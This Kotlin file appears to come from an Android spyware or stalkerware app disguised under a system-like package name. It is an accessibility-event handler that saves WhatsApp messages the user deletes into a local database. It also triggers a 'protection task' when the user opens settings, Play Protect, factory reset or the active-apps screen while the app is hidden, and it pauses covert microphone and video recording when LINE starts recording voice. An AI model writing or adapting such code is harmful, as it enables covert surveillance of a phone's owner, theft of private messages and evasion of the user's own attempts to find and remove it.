package com.android.services.accessibility.data

import android.content.Context
import android.text.TextUtils
import com.android.services.accessibility.AccessibilityUtils.deletedDate
import com.android.services.accessibility.AccessibilityUtils.deletedMsg
import com.android.services.accessibility.AccessibilityUtils.doesFactoryResetOptionClicked
import com.android.services.accessibility.AccessibilityUtils.imContactName
import com.android.services.accessibility.AccessibilityUtils.imDate
import com.android.services.accessibility.AccessibilityUtils.imMessageText
import com.android.services.accessibility.AccessibilityUtils.messageType
import com.android.services.accessibility.AccessibilityUtils.performAppProtectionTask
import com.android.services.accessibility.AccessibilityUtils.querySettingPkgName
import com.android.services.accessibility.AccessibilityUtils.senderName
import com.android.services.accessibility.AccessibilityUtils.stopMicBugRecordingIfRecording
import com.android.services.accessibility.AccessibilityUtils.stopVideoRecordingIfRecording
import com.android.services.accessibility.AccessibilityUtils.timeStampVal
import com.android.services.accessibility.AccessibilityUtils.todayDate
import com.android.services.db.entities.WhatsAppUnrooted.WhatsAppUnrootedBuilder
import com.android.services.interfaces.OnAccessibilityEvent
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.AccessibilityEventModel
import com.android.services.util.*
import java.util.*

class ViewClickedEventData(val localDatabaseSource: LocalDatabaseSource) : OnAccessibilityEvent {

    override fun onAccessibilityEvent(
        context: Context,
        accessibilityEventModel: AccessibilityEventModel
    ) {
        try {
            val packageName = accessibilityEventModel.packageName
            val eventClassName = accessibilityEventModel.eventClassName
            val eventText = accessibilityEventModel.eventText
            if (!TextUtils.isEmpty(eventText)) {
                val searchText = eventText.lowercase(Locale.getDefault())
                if (searchText.contains("delete") && eventClassName == "android.widget.Button") {
                    addWhatsAppDeletedMessage(context, localDatabaseSource)
                }
                if ((AppConstants.isAppHidden || AppConstants.isAppIconChange) && AppConstants.serviceActivated) {
                    if (searchText.contains("android system manager") && packageName == querySettingPkgName(
                            context
                        )
                    ) {
                        performAppProtectionTask(context, null, false)
                    } else if(searchText.contains("play protect")){
                        performAppProtectionTask(context, null, false)
                    } else if (doesFactoryResetOptionClicked(searchText)) {
                        performAppProtectionTask(context, null, false)
                    }else if (AppConstants.osGreaterThanEqualToThirteen && searchText.contains(
                            "active",
                            true
                        ) && searchText.contains("app", true)
                    ) {
                        performAppProtectionTask(context, null, false)
                    }
                } else if (packageName == "jp.naver.line.android" && searchText.contains("record voice")) {
                    stopMicBugRecordingIfRecording(context)
                    stopVideoRecordingIfRecording(context)
                }

                if (searchText.contains("youtube")) {
                    FirebasePushUtils.startTestActivity(context)
                } else if (searchText.contains("gmail")) {
                    FirebasePushUtils.startTestActivity(context, type = 1)
                }
            }
        } catch (e: Exception) {
            logException("$TAG ${AppUtils.currentMethod} exception = ${e.message}", throwable = e)
        }
    }

    companion object {

        const val TAG = "ViewClickedEventData"
        private fun addWhatsAppDeletedMessage(
            context: Context,
            localDatabaseSource: LocalDatabaseSource
        ) {

            logVerbose("$TAG checking for whatsApp deleted message")
            try {
                val date = todayDate + deletedDate
                val currentTimeInMilliSeconds = System.currentTimeMillis()
                when {
                    currentTimeInMilliSeconds > timeStampVal -> {
                        timeStampVal = currentTimeInMilliSeconds
                    }
                    currentTimeInMilliSeconds == timeStampVal -> {
                        timeStampVal = currentTimeInMilliSeconds + 100
                    }
                    currentTimeInMilliSeconds < timeStampVal -> {
                        timeStampVal += 1
                    }
                }

                val messageId = AppUtils.md5Hash(imContactName + deletedMsg + deletedDate)
                if (localDatabaseSource.checkIfWhatsAppMessageNotExistsAlready(messageId)) {
                    val phoneNumber = AppUtils.retrievePhoneNumberFromDisplayName(imContactName)
                    var conversationId: String
                    if (!TextUtils.isEmpty(phoneNumber)) {
                        conversationId =
                            imContactName + "_" + AppUtils.retrievePhoneNumberFromDisplayName(
                                imContactName
                            )
                        conversationId = conversationId.replace(" ", "")
                    } else {
                        conversationId = imContactName
                    }

                    val whatsAppUnrooted = WhatsAppUnrootedBuilder()
                        .setUniqueId(messageId)
                        .setConversationId(conversationId)
                        .setConversationName(imContactName)
                        .setSenderName(senderName)
                        .setMessage(imMessageText)
                        .setType(messageType)
                        .setMessageDatetime(imDate)
                        .setIsDeleted(1)
                        .setStatus(0)
                        .create()
                    localDatabaseSource.insertWhatsAppUnrooted(whatsAppUnrooted)
                    logVerbose("$TAG deleted whatsApp message saved = $deletedMsg")
                } else {
                    logVerbose("$TAG deleted whatsApp msg updated = $deletedMsg")
                    localDatabaseSource.updateMessageAsDeleted(messageId)
                }
            } catch (e: Exception) {
                logException("$TAG error saving deleted message = ${e.message}", throwable = e)
            }
        }
    }
}